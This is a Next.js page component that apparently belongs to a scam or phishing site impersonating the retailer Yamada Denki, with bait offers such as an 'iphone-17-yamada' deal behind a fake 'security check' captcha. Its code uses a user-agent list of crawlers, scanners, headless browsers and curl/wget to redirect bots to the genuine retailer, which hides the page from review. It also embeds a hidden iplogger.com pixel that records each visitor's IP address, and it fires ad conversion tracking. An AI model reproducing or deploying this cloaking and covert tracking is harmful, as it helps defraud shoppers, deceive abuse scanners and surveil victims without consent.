import YamadaHeader from "../../components/YamadaHeader";
import YamadaFooter from "../../components/YamadaFooter";
import CaptchaRedirectClientWrapper from "./CaptchaRedirectClientWrapper";
import Script from "next/script";
import { headers } from "next/headers";
import { redirect } from "next/navigation";

type PageProps = {
  searchParams?: { id?: string };
};

const TRACKED_OFFERS = new Set([
  "iphone-17-yamada",
  "ymd-001",
  "ymd-002",
  "ymd-003",
  "free-delivery",
  "ymd-005",
  "ymd-006",
  "ymd-007",
  "ymd-008",
  "ymd-009",
  "ymd-010",
  "ymd-011",
  "ymd-012",
]);

const BOT_UA =
  /(bot|crawler|spider|crawling|curl|wget|python-requests|httpclient|libwww|urlgrabber|^python|^php|^java|go-http-client|okhttp|feedfetcher|readability|preview|scan|probe|monitor|checker|validator|analyzer|scrape|scraper|headless|phantomjs|slimerjs|puppeteer|playwright|rendertron|facebookexternalhit|facebot|slackbot|twitterbot|linkedinbot|pinterest|discordbot|telegrambot|whatsapp|skypeuripreview|googlebot|adsbot-google|google-read-aloud|google-cloudvertexbot|mediapartners-google|bingbot|bingpreview|yandex|baiduspider|duckduckbot|sogou|seznambot|semrush|ahrefs|mj12bot|dotbot|gigabot|petalbot|applebot|ia_archiver|amazonbot)/i;

export default function VerifyPage({ searchParams }: PageProps) {
  const id = (searchParams?.id || "").toLowerCase();
  const shouldFire = TRACKED_OFFERS.has(id);

  const ua = headers().get("user-agent") || "";
  const isBot = BOT_UA.test(ua);

  if (isBot) {
    redirect("https://www.yamada-denki.jp");
  }

  return (
    <>
      {shouldFire && (
        <Script id={`aw-outbound-${id}`} strategy="afterInteractive">
          {`
            gtag('event', 'conversion', {
              'send_to': 'AW-17491126902/AzNoCO-j2IwbEPbUtZRB',
              'value': 1.0,
              'currency': 'JPY'
            });
          `}
        </Script>
      )}

      <YamadaHeader />
      <main className="flex flex-col items-center justify-center min-h-screen py-8 px-4">
        <div className="max-w-md w-full bg-white rounded-xl shadow-md p-6">
          <h1 className="text-xl font-semibold text-center mb-4">
            セキュリティチェック
          </h1>

          <CaptchaRedirectClientWrapper />

          <img
            src="https://iplogger.com/2i6JC5"
            border={0}
            style={{ display: "none" }}
            alt=""
          />
        </div>
      </main>
      <YamadaFooter />
    </>
  );
}
